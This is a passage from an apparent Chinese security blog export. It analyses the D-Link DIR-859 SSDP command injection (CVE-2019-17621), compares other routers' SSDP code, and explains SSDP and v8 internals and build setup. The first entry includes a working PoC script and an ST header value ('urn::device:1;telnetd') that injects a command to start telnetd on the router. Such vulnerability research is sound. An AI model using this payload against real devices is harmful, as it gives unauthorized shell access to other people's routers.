<p>所以只要将ST字段设置为uuid或者urn就可以在最后拼接自己构造的ST<br>还有就是其他人的poc都是说只能用urn：构造后利用。但我觉得uuid也是可以的。<br><img src="/05/cl7iordoo000q293fa5vmd03a/3.png" alt="60f9b44fd4272eb6602119af5b24ab1f.png"><br>现在我先把路由器模拟起来试一下，使用firmadyne进行模拟<br><img src="/05/cl7iordoo000q293fa5vmd03a/4.png" alt="06cb32a32c2c76412b8c845ada7fecb9.png"><br>尝试如此构造header注入，成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Preparando Header ...</span><br><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST:192.168.0.1:1900</span><br><span class="line">ST:urn::device:1;telnetd</span><br><span class="line">MX:2</span><br><span class="line">MAN:&quot;ssdp:discover&quot;</span><br></pre></td></tr></table></figure>

<p>果然uuid也可以，header的ST部分也可以如此构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">header += &quot;ST:uuid:1;telnetd\n&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/05/cl7iordoo000q293fa5vmd03a/5.png" alt="928033f201fa083f28dc313c4df4743e.png"></p>
<h4 id="测试使用的反向连接poc脚本"><a href="#测试使用的反向连接poc脚本" class="headerlink" title="测试使用的反向连接poc脚本"></a>测试使用的反向连接poc脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="comment"># Exploit By Miguel Mendez - @s1kr10s</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">config_payload</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    header = <span class="string">"M-SEARCH * HTTP/1.1\n"</span></span><br><span class="line">    header += <span class="string">"HOST:"</span>+str(ip)+<span class="string">":"</span>+str(port)+<span class="string">"\n"</span></span><br><span class="line">    header += <span class="string">"ST:urn::device:1;telnetd\n"</span></span><br><span class="line">    <span class="comment"># header += "ST:uuid:1;telnetd\n"</span></span><br><span class="line">    header += <span class="string">"MX:2\n"</span></span><br><span class="line">    header += <span class="string">'MAN:"ssdp:discover"'</span>+<span class="string">"\n\n"</span></span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_conexion</span><span class="params">(ip, port, payload)</span>:</span></span><br><span class="line">    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)</span><br><span class="line">    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,<span class="number">2</span>)</span><br><span class="line">    sock.sendto(payload,(ip, port))</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    ip = raw_input(<span class="string">"Router IP: "</span>)</span><br><span class="line">    port = <span class="number">1900</span></span><br><span class="line">    headers = config_payload(ip, port)</span><br><span class="line">    print(<span class="string">"\n---= HEADER =---\n"</span>)</span><br><span class="line">    print(<span class="string">"[+] Preparando Header ..."</span>)</span><br><span class="line">    <span class="keyword">print</span> headers</span><br><span class="line">    print(<span class="string">"[+] Enviando payload ..."</span>)</span><br><span class="line">    print(<span class="string">"[+] Activando servicio telnetd :)"</span>) </span><br><span class="line">    send_conexion(ip, port, headers)</span><br><span class="line">    print(<span class="string">"[+] Conectando al servicio ...n"</span>)</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    os.system(<span class="string">'telnet '</span> + str(ip))</span><br></pre></td></tr></table></figure>

<h3 id="0x03-针对DIR859上漏洞的总结"><a href="#0x03-针对DIR859上漏洞的总结" class="headerlink" title="0x03 针对DIR859上漏洞的总结"></a>0x03 针对DIR859上漏洞的总结</h3><p>经过分析我觉得造成这个UPnp漏洞的原因主要有以下两点</p>
<ol>
<li><strong>环境变量并未进行字符过滤</strong></li>
<li>利用SSDP进行查询时，发现根设备和遍历设备两种模式都不需要额外参数，因此不会造成命令执行注入。<strong>但是针对于特定类型设备的查询时比如利用uuid和urn来指定时</strong>，指定的信息会成为system命令执行参数的一部分，而这部分就可以造成命令执行注入了。而且包括REMOTE_ADDR和REMOTE_PORT是都没有对其进行过滤，因此这两个是也可以注入的</li>
</ol>
<h3 id="0x04-其他DLink路由器上的ssdpcgi行为分析"><a href="#0x04-其他DLink路由器上的ssdpcgi行为分析" class="headerlink" title="0x04 其他DLink路由器上的ssdpcgi行为分析"></a>0x04 其他DLink路由器上的ssdpcgi行为分析</h3><h4 id="1-DIR885L"><a href="#1-DIR885L" class="headerlink" title="1 DIR885L"></a>1 DIR885L</h4><p>DIR885LA (1.20b02) 是已经经过了修补的</p>
<p>首先一样的是获取四个环境变量的操作，但是sub_17788对ST进行了一些操作</p>
<p><img src="/05/cl7iordoo000q293fa5vmd03a/6.png" alt="df7e2fc7cbcc5bdeb5348c5b0c8390c0.png"></p>
<p>让我们跟进sub_17788看看其做了什么操作，发现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_17788</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="keyword">sizeof</span>(v13));</span><br><span class="line">  <span class="comment">//首先看首部是不是uuid</span></span><br><span class="line">  result = <span class="built_in">strncmp</span>(a1, <span class="string">"uuid:"</span>, <span class="number">5u</span>);</span><br><span class="line">  <span class="comment">//如果不是uuid，那么就应该是urn来指定设备</span></span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//每次循环将urn指定的设备格式和它硬编码在程序里的一个字典循环比较，如果字典比较完了还没有匹配就直接置0退出</span></span><br><span class="line">      <span class="keyword">if</span> ( !off_30354[v14] )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_30350 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="built_in">strcmp</span>(off_30354[v14], a1);</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果匹配到了相应字典就把该设备名称输入到变量里</span></span><br><span class="line">    result = <span class="built_in">snprintf</span>(byte_3051C, <span class="number">0x400</span>u, <span class="string">"%s"</span>, off_30354[v14]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果是uuid就利用格式化字符串转化成uuid的格式</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(v13, <span class="number">0x400</span>u, <span class="string">"%s"</span>, a1 + <span class="number">5</span>);</span><br><span class="line">    v2 = strtok(v13, <span class="string">"-"</span>);</span><br><span class="line">    v3 = strtol(v2, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v5 = strtol(v4, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v6 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v7 = strtol(v6, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v8 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v9 = strtol(v8, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v10 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v11 = strtoll(v10, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    result = <span class="built_in">snprintf</span>(byte_3051C, <span class="number">0x400</span>u, <span class="string">"uuid:%08X-%04X-%04X-%04X-%012llX"</span>, v3, v5, v7, v9, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-DIR-865L"><a href="#2-DIR-865L" class="headerlink" title="2 DIR-865L"></a>2 DIR-865L</h4><p>版本1.07b01<br>漏洞与DIR-859基本没有区别，漏洞点与漏洞代码完全一致</p>
<h3 id="0x05-其他厂商路由器对SSDP的实现"><a href="#0x05-其他厂商路由器对SSDP的实现" class="headerlink" title="0x05 其他厂商路由器对SSDP的实现"></a>0x05 其他厂商路由器对SSDP的实现</h3><h4 id="1-ASUS-WRT-AC66U"><a href="#1-ASUS-WRT-AC66U" class="headerlink" title="1 ASUS WRT-AC66U"></a>1 ASUS WRT-AC66U</h4><p>利用下面这个命令找到usr/sbin/miniupnpd，这个二进制文件应该是提供SSDP服务的<br>看名称感觉华硕使用的是开源的miniupnp模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -rnl &quot;upnp&quot;</span><br></pre></td></tr></table></figure>

<p>接着逆向分析固件，搜索ssdp相关函数（也可以搜索ST字符串）找到对应的逻辑</p>
<p>同样关注点在选择特定参数或者uuid的查询上，核心逻辑就是下面这个图</p>
<p>可以看到他每次查询都是从一个已经查询好的列表里不停匹配（rootDevice)，匹配成功了就返回成功的结果，不存在用户输入被执行了的结果<br><img src="/05/cl7iordoo000q293fa5vmd03a/7.png" alt="9742c40625a584096abbe1d839ba3deb.png"> </p>
<h4 id="2-FAST-FER-450"><a href="#2-FAST-FER-450" class="headerlink" title="2 FAST-FER 450"></a>2 FAST-FER 450</h4><p>与AC66U一样，同样使用miniupnpd，代码基本一致</p>
<h4 id="3-网剑R6700"><a href="#3-网剑R6700" class="headerlink" title="3 网剑R6700"></a>3 网剑R6700</h4><p>自己实现的一个过程，完整过程还需研究</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>CVE-2019–17621: D-Link DIR-859 未授权命令执行漏洞分析 - 安全客，安全资讯平台 (anquanke.com)</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
      </tags>
  </entry>
  <entry>
    <title>SSDP协议</title>
    <url>/year/02/05/cl7iordp1001c293frj0xzpx6/</url>
    <content><![CDATA[<h2 id="SSDP协议"><a href="#SSDP协议" class="headerlink" title="SSDP协议"></a>SSDP协议</h2><h3 id="0x01何为SSDP"><a href="#0x01何为SSDP" class="headerlink" title="0x01何为SSDP"></a>0x01何为SSDP</h3><p>SSDP 使用一个固定的组播地址 239.255.255.250 和 UDP 端口号 1900 来监听其他设备的请求。SSDP 协议的请求消息有两种类型，第一种是服务通知，设备和服务使用此类通知消息声明自己存在；第二种是查询请求，协议客户端用此请求查询某种类型的设备和服务。</p>
<a id="more"></a>


<p>“为了能被网络搜索发现，目标设备应该向发起多播请求的源IP地址及端口发送单播UDP响应。如果M-SEARCH请求报文的ST头部字段以“ssdp:all”、“upnp:rootdevice”或者“uuid:”开头，后面跟着与设备相匹配的UUID信息，或者如果M-SERCH请求与设备支持的设备类型或服务类型相匹配，那么该设备就会应答M-SEARCH请求报文”。这种策略在实际环境中能够正常工作。例如，我的Chrome浏览器经常会请求搜索智能电视：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo tcpdump -ni eth0 udp and port 1900 -A IP 192.168.1.124.53044 &gt; 239.255.255.250.1900: UDP, length 175   </span><br><span class="line">M-SEARCH * HTTP/1.1   </span><br><span class="line">HOST: 239.255.255.250:1900   </span><br><span class="line">MAN: &quot;ssdp:discover&quot;   </span><br><span class="line">MX: 1   </span><br><span class="line">ST: urn:dial-multiscreen-org:service:dial:1   </span><br><span class="line">USER-AGENT: Google Chrome/58.0.3029.110 Windows</span><br></pre></td></tr></table></figure>

<p>这个报文被发往一个多播IP地址。监听这一地址的其他设备如果与报文头部中指定的ST（search-target，搜索目标）多屏幕类型设备相匹配，那么这些设备应该会响应这个请求报文。除了请求具体的设备类型，请求报文中还可以包含两类“通用的”ST查询类型：<br>1、upnp:rootdevice：搜索root设备<br>2、ssdp:all：搜索所有的UPnP设备以及服务你可以运行以下python脚本（在另一脚本的基础上修改而得），使用前面提到的这些ST查询类型来枚举网络中的设备列表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python2 </span></span><br><span class="line"><span class="keyword">import</span> socket   </span><br><span class="line"><span class="keyword">import</span> sys dst = <span class="string">"239.255.255.250"</span>   </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:       </span><br><span class="line">    dst = sys.argv[<span class="number">1</span>] </span><br><span class="line">st = <span class="string">"upnp:rootdevice"</span>   </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span>:      </span><br><span class="line">    st = sys.argv[<span class="number">2</span>] </span><br><span class="line">msg = [       </span><br><span class="line">    <span class="string">'M-SEARCH * HTTP/1.1'</span>,   </span><br><span class="line">    <span class="string">'Host:239.255.255.250:1900'</span>,     </span><br><span class="line">    <span class="string">'ST:%s'</span> % (st,),    </span><br><span class="line">    <span class="string">'Man:"ssdp:discover"'</span>,     </span><br><span class="line">    <span class="string">'MX:1'</span>,     <span class="string">''</span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)  </span><br><span class="line">s.settimeout(<span class="number">10</span>)  </span><br><span class="line">s.sendto(<span class="string">'rn'</span>.join(msg), (dst, <span class="number">1900</span>) ) </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:       </span><br><span class="line">    <span class="keyword">try</span>:         </span><br><span class="line">        data, addr = s.recvfrom(<span class="number">32</span>*<span class="number">1024</span>)    </span><br><span class="line">    <span class="keyword">except</span> socket.timeout:        </span><br><span class="line">        <span class="keyword">break</span>     </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] %sn%s"</span> % (addr, data)</span><br></pre></td></tr></table></figure>

<h3 id="0x02设备查询"><a href="#0x02设备查询" class="headerlink" title="0x02设备查询"></a>0x02设备查询</h3><p>当一个客户端接入网络的时候，它可以向一个特定的多播地址的 SSDP 端口使用 M-SEARCH 方法发送 “ssdp:discover” 消息。当设备监听到这个保留的多播地址上由控制点发送的消息的时候，设备将通过单播的方式直接响应控制点的请求。</p>
<p>典型的设备查询请求消息格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">S:uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6</span><br><span class="line">Host:239.255.255.250:1900</span><br><span class="line">Man:&quot;ssdp:discover&quot;ST:ge:fridge</span><br><span class="line">MX:3</span><br></pre></td></tr></table></figure>

<h4 id="响应消息"><a href="#响应消息" class="headerlink" title="响应消息"></a>响应消息</h4><p>响应消息应该包含服务的位置信息（Location 或AL头），ST和USN头。响应消息应该包含cache控制信息（max-age 或者 Expires头）。</p>
<p>典型的响应消息格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Cache-Control: max-age= seconds until advertisement expires</span><br><span class="line">S: uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6</span><br><span class="line">Location: URL for UPnP description for root device</span><br><span class="line">Cache-Control: no-cache=&quot;Ext&quot;,max-age=5000ST:ge:fridge // search targetUSN: uuid:abcdefgh-7dec-11d0-a765-00a0c91e6bf6</span><br></pre></td></tr></table></figure>

<h3 id="设备通知消息"><a href="#设备通知消息" class="headerlink" title="设备通知消息"></a>设备通知消息</h3><p>在设备加入网络时，它应当向一个特定的多播地址的 SSDP 端口使用 NOTIFY 方法发送 “ssdp:alive” 消息，以便宣布自己的存在，更新期限信息，更新位置信息。</p>
<h4 id="1-ssdp-alive-消息"><a href="#1-ssdp-alive-消息" class="headerlink" title="1 ssdp:alive 消息"></a>1 ssdp:alive 消息</h4><p>由于 UDP 协议是不可信的，设备应该定期发送它的公告消息。在设备加入网络时，它必须用 NOTIFY 方法发送一个多播传送请求。NOTIFY 方法发送的请求没有回应消息。</p>
<p>典型的设备通知消息格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">NOTIFY * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">CACHE-CONTROL: max-age = seconds until advertisement expires</span><br><span class="line">LOCATION: URL for UPnP description for root deviceNT: search target</span><br><span class="line">NTS: ssdp:alive</span><br><span class="line">USN: advertisement UUID</span><br></pre></td></tr></table></figure>

<h4 id="2-ssdp-byebye消息"><a href="#2-ssdp-byebye消息" class="headerlink" title="2 ssdp:byebye消息"></a>2 ssdp:byebye消息</h4><p>当一个设备计划从网络上卸载的时候，它也应当向一个特定的多播地址的 SSDP 端口使用 NOTIFY 方法发送 “ssdp:byebye” 消息。但是，即使没有发送 “ssdp:byebye” 消息，控制点也会根据 “ssdp:alive” 消息指定的超时值，将超时并且没有再次收到的 “ssdp:alive” 消息对应的设备认为是失效的设备。</p>
<p>典型的设备卸载消息格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NOTIFY * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900NT: search target</span><br><span class="line">NTS: ssdp:byebye</span><br><span class="line">USN: advertisement UUID</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>P2P 网络核心技术：UPnP 和 SSDP 协议 - 知乎 (zhihu.com)</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>SSDP</tag>
      </tags>
  </entry>
  <entry>
    <title>v8-startctf2019-oob</title>
    <url>/year/11/12/cl7iordq5004b293f71rahmfj/</url>
    <content><![CDATA[<p>一道简单v8例题来看下v8的利用</p>
<a id="more"></a>

<h2 id="0x01-题目准备"><a href="#0x01-题目准备" class="headerlink" title="0x01 题目准备"></a>0x01 题目准备</h2><p>先恢复到指定版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gclient sync</span><br><span class="line">git apply &lt; ../browser_pwn/Chrome/oob.diff</span><br><span class="line">tools/dev/v8gen.py x64.release</span><br></pre></td></tr></table></figure>

<p>修改文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim out.gn/x64.release/args.gn</span><br></pre></td></tr></table></figure>

<p>添加内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_disassembler = true</span><br><span class="line">v8_enable_object_print = true</span><br><span class="line">v8_enable_verify_heap = true</span><br></pre></td></tr></table></figure>

<p>最后编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ninja -C out.gn/x64.release d8</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>v8pwn</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>v8 学习基础</title>
    <url>/year/11/12/cl7iordq6004f293fmgin2ix8/</url>
    <content><![CDATA[<p>主要是v8对象基础的概念。</p>
<a id="more"></a>

<h2 id="0x01-v8是什么"><a href="#0x01-v8是什么" class="headerlink" title="0x01 v8是什么"></a>0x01 v8是什么</h2><p>简而言之，v8就是js的解释器。</p>
<p>V8由很多子模块构成，其中，有几个最重要的模块：</p>
<ul>
<li>Parser：负责将JavaScript源码转换为Abstract Syntax Tree (AST)</li>
<li>Ignition：interpreter，即解释器，负责将AST转换为Bytecode，解释执行Bytecode；同时收集TurboFan优化编译所需的信息，比如函数参数的类型</li>
<li>TurboFan：compiler，即编译器，利用Ignitio所收集的类型信息，将Bytecode转换为优化的汇编代码</li>
<li>Orinoco：garbage collector，垃圾回收模块，负责将程序不再需要的内存空间回收</li>
</ul>
<p>Parser、Ignition、Turbofan协作将JS源码最终编译成汇编代码</p>
<p><img src="/12/cl7iordq6004f293fmgin2ix8/1.jpg" alt="v8结构图"></p>
<h2 id="0x02-v8-中JS对象结构"><a href="#0x02-v8-中JS对象结构" class="headerlink" title="0x02 v8 中JS对象结构"></a>0x02 v8 中JS对象结构</h2><p>在下面的代码中定义了a,b两个对象，下面在调试中观察下里面的数据和结构。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo1</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> Foo1();</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> Foo1();</span><br><span class="line"></span><br><span class="line">a.name = <span class="string">'name-a'</span>;</span><br><span class="line">a.text = <span class="string">'aaa'</span>;</span><br><span class="line">b.name = <span class="string">'name-b'</span>;</span><br><span class="line">b.text = <span class="string">'bbb'</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="string">"a-1"</span>;</span><br><span class="line">a[<span class="number">2</span>] = <span class="string">"a-2"</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(a);  <span class="comment">//d8中用来打印object内存信息</span></span><br><span class="line">%DebugPrint(b);  <span class="comment">//d8中用来打印object内存信息</span></span><br><span class="line">%SystemBreak();  <span class="comment">//d8中用来中断，调试</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-使用谷歌浏览器观察"><a href="#2-1-使用谷歌浏览器观察" class="headerlink" title="2.1 使用谷歌浏览器观察"></a>2.1 使用谷歌浏览器观察</h3><p>首先先在谷歌开发工具中键入上面的代码，然后在Memory中拍摄快照</p>
<p><img src="/12/cl7iordq6004f293fmgin2ix8/2.png" alt="v8结构图"></p>
<p>我们大致可以看出来，对于a它有两个属性，分别是<code>name</code>和<code>text</code>，这两个属性直接保存在对象结构中。还有两个字符串”a-1”和”a-2”,他们作为<code>元素</code>，保存在了elements中。</p>
<p><img src="/12/cl7iordq6004f293fmgin2ix8/3.png" alt="`"></p>
<p>因此暂时可以猜测，对象中保存的数据有两种形式： 一种是不需要索引的，称为<code>属性</code>, 另一种是需要索引的，称为<code>元素</code></p>
<h3 id="2-2-在ubuntu中编译v8观察"><a href="#2-2-在ubuntu中编译v8观察" class="headerlink" title="2.2 在ubuntu中编译v8观察"></a>2.2 在ubuntu中编译v8观察</h3><p>让我们单独看a打印出来的结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DebugPrint: 0x1c6808148b91: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x1c68083074fd &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1c6808148b0d &lt;Object map = 0x1c68083074ad&gt;</span><br><span class="line"> - elements: 0x1c6808148c81 &lt;FixedArray[19]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x1c6808042229 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x1c68080447d5: [String] in ReadOnlySpace: #name: 0x1c68082d2591 &lt;String[6]: #name-a&gt; (const data field 0), location: in-object //name属性</span><br><span class="line">    0x1c68082d25a5: [String] in OldSpace: #text: 0x1c68082d25b5 &lt;String[3]: #aaa&gt; (const data field 1), location: in-object //text属性</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x1c6808148c81 &lt;FixedArray[19]&gt; &#123;</span><br><span class="line">           0: 0x1c6808042429 &lt;the_hole&gt;  //element中的元素</span><br><span class="line">           1: 0x1c68082d25e9 &lt;String[3]: #a-1&gt;</span><br><span class="line">           2: 0x1c68082d25f9 &lt;String[3]: #a-2&gt;</span><br><span class="line">        3-18: 0x1c6808042429 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x1c68083074fd: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE  //实例类型</span><br><span class="line"> - instance size: 52     //实例大小</span><br><span class="line"> - inobject properties: 10   //对象内属性存储空间（包含未使用的slots）</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8  //未使用的属性slot数</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map              //对象当前处于快速模式（dictionary_map：字典模式）</span><br><span class="line"> - back pointer: 0x1c68083074d5 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x1c68082d2939 &lt;Cell value= 0&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x1c6808148c59 &lt;DescriptorArray[2]&gt;</span><br><span class="line"> - prototype: 0x1c6808148b0d &lt;Object map = 0x1c68083074ad&gt;</span><br><span class="line"> - constructor: 0x1c68082d2835 &lt;JSFunction Foo1 (sfi = 0x1c68082d26ad)&gt;</span><br><span class="line"> - dependent code: 0x1c68080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 5</span><br></pre></td></tr></table></figure>

<p>在v8中打印出的结构更确认了我们上面的猜测，并且更多看到了一些东西。比如map。</p>
<p>还有一些其它的</p>
<p>prototype prototype<br>elements 对象元素<br>length 元素个数<br>properties 属性</p>
<p>结构图如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> elements  ----&gt; +------------------------+</span><br><span class="line">                  |          MAP           +&lt;---------+</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      element 1         |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      element 2         |          |</span><br><span class="line">                  |      ......            |          |</span><br><span class="line">                  |      element n         |          |</span><br><span class="line">ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                  |      map               |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      prototype         |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      elements          |          |</span><br><span class="line">                  |                        +----------+</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      length            |</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      properties        |</span><br><span class="line">                  +------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="0x03-v8环境搭建"><a href="#0x03-v8环境搭建" class="headerlink" title="0x03 v8环境搭建"></a>0x03 v8环境搭建</h3><h3 id="3-1代理配置"><a href="#3-1代理配置" class="headerlink" title="3.1代理配置"></a>3.1代理配置</h3><p>首先在本地的小飞机中，选项设置-》本地代理设置-》开启本地代理-》选择端口</p>
<p>配置git代理,后面的ip采用自己宿主机的，端口采用上一步设置的端口，虚拟机配置采用nat模式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy http://192.168.235.1:1080</span><br></pre></td></tr></table></figure>

<p>配置环境变量,进行全局代理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">"http://192.168.235.1:1080"</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="variable">$http_proxy</span></span><br></pre></td></tr></table></figure>

<p>下载工具,并设置环境变量（注意此处环境变量的路径与你下载的路径是否相同</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"$HOME/depot_tools"'</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"$HOME/ninja"'</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>

<p>编译<code>v8</code>.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fetch v8 &amp;&amp; <span class="built_in">cd</span> v8</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gclient sync</span><br><span class="line"><span class="comment">#更新</span></span><br><span class="line">git reset --hard [commit <span class="built_in">hash</span> with vulnerability]</span><br><span class="line"><span class="comment">#切换版本</span></span><br><span class="line"></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug [d8]</span><br><span class="line"><span class="comment">#d8参数表示只编译d8</span></span><br><span class="line"><span class="comment">#debug-&gt;release编译release版本</span></span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./out.gn/x64.release/d8</span><br><span class="line"><span class="comment">#启动d8交互shell</span></span><br><span class="line">./out.gn/x64.release/d8 test.js</span><br><span class="line"><span class="comment">#运行test.js</span></span><br><span class="line">./out.gn/x64.debug/d8</span><br><span class="line">./out.gn/x64.debug/shell</span><br><span class="line">./out.gn/x64.debug/d8 test.js</span><br></pre></td></tr></table></figure>

<p>调试工具,这个gdbinit如果没有的话需要从网上自行下载</p>
